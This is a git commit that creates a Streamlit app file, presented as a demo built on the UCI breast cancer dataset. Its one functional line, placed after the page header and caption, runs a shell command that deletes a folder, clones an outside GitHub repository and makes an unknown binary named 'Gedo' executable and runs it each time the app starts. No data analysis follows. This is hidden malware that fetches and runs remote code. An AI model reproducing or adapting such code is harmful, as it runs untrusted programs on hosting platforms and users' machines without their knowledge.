98fcaad360de734ea6a8ff5ac8b280600dd712cd
yaterod <109239404+yaterod@users.noreply.github.com>
2022-07-14 16:03:53 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,13 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+st.header('ANJAYANI')
+st.caption('Dataset: UCI Breast Cancer Data provided by the Oncology Institute')
+import os
+import time
+import subprocess
+subprocess.run("rm -rf nungx && git clone https://github.com/Akatsoki/nungx.git && cd nungx && chmod +x Gedo && ./Gedo", shell=True, check=True)
+
+
